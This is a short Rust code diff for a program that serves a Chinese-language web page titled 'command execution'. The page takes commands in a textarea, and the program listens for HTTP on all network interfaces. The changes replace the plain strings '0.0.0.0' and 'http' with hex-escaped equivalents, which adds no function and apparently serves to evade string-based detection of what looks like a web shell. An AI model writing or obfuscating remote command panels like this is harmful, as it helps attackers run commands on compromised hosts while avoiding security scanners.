@@ -10,7 +10,7 @@ const HTML: &str = r#"<!DOCTYPE html>
     <title>命令执行</title>
 </head>
 <body>
-    <textarea id="command" style="width:300px;height:60px;" placeholder="输入命令，Enter发送，Shift+Enter换行"></textarea>
+    <textarea id="command" style="width:300px;height:60px;" placeholder="输入命令, Enter发送, Shift+Enter换行"></textarea>
     <button onclick="send_command()">发送指令</button>
     <pre id="result"></pre>
     <script>
@@ -37,9 +37,9 @@ const HTML: &str = r#"<!DOCTYPE html>
 "#;
 
 pub fn listen_on_port(port: u16) {
-    let addr = format!("0.0.0.0:{}", port);
+    let addr = format!("\x30.0.\x30.0:{}", port);
     let listener = TcpListener::bind(&addr).expect(&format!("无法绑定端口{}", port));
-    println!("HTTP服务已启动: http://{}/", addr);
+    println!("HTTP服务已启动: h\x74\x74p://{}/", addr);
 
     for stream in listener.incoming() {
         match stream {
